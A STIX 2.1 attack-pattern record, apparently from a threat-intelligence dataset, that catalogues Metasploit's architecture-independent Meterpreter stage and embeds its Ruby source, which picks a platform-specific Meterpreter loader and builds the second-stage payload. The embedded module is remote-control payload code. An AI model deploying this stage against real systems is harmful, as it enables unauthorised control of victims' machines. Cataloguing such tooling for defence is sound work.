{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--677c7da6-3edf-49d2-8baa-9468cd9e700b",
    "created": "2024-08-14T16:33:19.272142Z",
    "modified": "2024-08-14T16:33:19.272145Z",
    "name": "Architecture-Independent Meterpreter Stage",
    "description": "Handle Meterpreter sessions regardless of the target arch/platform",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stages/multi/meterpreter.rb",
            "external_id": "meterpreter.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# Injects the meterpreter server DLL via the Reflective Dll Injection payload\n# along with transport related configuration.\n#\n###\n\nmodule MetasploitModule\n\n  include Msf::Sessions::MeterpreterOptions\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'Architecture-Independent Meterpreter Stage',\n      'Description'   => 'Handle Meterpreter sessions regardless of the target arch/platform',\n      'Author'        => ['OJ Reeves'],\n      'PayloadCompat' => {'Convention' => 'http https'},\n      'License'       => MSF_LICENSE,\n      'Platform'      => ['multi'],\n      'Arch'          => ARCH_ALL,\n      'Session'       => Msf::Sessions::Meterpreter_Multi\n   ))\n  end\n\n  def stage_payload(opts={})\n    return '' unless opts[:uuid]\n\n    ## TODO: load the datastore \"stuff\" from the JSON file\n    ## and wire it into opts[:datastore].\n    ## and if we find an instance, hydrate based on that.\n    ## otherwise use some \"sane defaults\" as shown below.\n\n    c = Class.new(::Msf::Payload)\n    c.include(::Msf::Payload::Stager)\n\n    case opts[:uuid].platform\n    when 'python'\nc.include(::Msf::Payload::Python::MeterpreterLoader)\n    when 'java'\nc.include(::Msf::Payload::Java::MeterpreterLoader)\n    when 'android'\nc.include(::Msf::Payload::Android::MeterpreterLoader)\n    when 'php'\nc.include(::Msf::Payload::Php::MeterpreterLoader)\n    when 'windows'\nif opts[:uuid].arch == ARCH_X86\n        c.include(::Msf::Payload::Windows::MeterpreterLoader)\n      else\n        c.include(::Msf::Payload::Windows::MeterpreterLoader_x64)\n      end\n    else\n      return ''\n    end\n\n    second_stage = c.new()\n\n    # wire in the appropriate values for transport and datastore configs\n    opts[:transport_config] = [transport_config(opts)]\n    opts[:datastore] = datastore\n\n    second_stage.stage_payload(opts)\n  end\nend\n",
    "x_mitre_platforms": [
        "['multi']"
    ]
}